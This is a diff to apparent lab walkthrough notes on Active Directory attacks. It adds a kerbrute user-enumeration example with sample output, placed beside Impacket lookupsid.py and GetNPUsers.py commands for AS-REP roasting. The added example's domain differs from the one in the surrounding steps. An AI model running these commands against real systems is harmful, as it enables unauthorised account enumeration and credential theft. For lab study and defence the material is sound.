@@ -34,6 +34,18 @@ python3 lookupsid.py anonymous@10.10.10.10 | tee users.txt
 grep SidTypeUser users.txt | awk '{print $2}' | cut -d "\\" -f2 > users.txt
 ````
 - Now, let’s use `GetNPUsers.py` to find users without Kerberos pre-authentication:
+- Example Syntax
+````
+kerbrute -users userlist.txt -domain spookysec.local -dc-ip 10.10.55.114
+Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
+
+[*] Valid user => james
+[*] Valid user => svc-admin [NOT PREAUTH]
+[*] Valid user => James
+[*] Valid user => robin
+[*] Blocked/Disabled user => guest
+[*] Valid user => darkstar
+````
 ````
 python3 GetNPUsers.py vulnnet-rst.local/ -no-pass -userfile usernames.txt
 ````
